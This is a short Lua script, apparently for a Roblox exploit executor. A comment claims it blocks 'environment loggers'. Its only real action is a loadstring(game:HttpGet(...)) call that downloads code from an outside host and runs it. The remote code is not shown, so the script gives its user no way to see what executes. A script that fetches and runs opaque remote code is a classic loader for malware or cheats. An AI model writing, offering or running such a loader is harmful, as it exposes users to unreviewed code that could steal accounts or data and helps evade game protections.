-- Prevents every type of environment logger please credit me while using this!
if not game:IsLoaded() then
    game.Loaded:Wait()
end

local success, err = pcall(function()
    loadstring(game:HttpGet("https://gate.astrarservices.de/v2/files/495fcbbf59b543aca6d6798080883a3a"))()
end)

if success then
    -- Everything is good
else
    warn("Loadstring failed:", err)
    warn("AstrarServices: Does your environment support load/loadstring?")
end
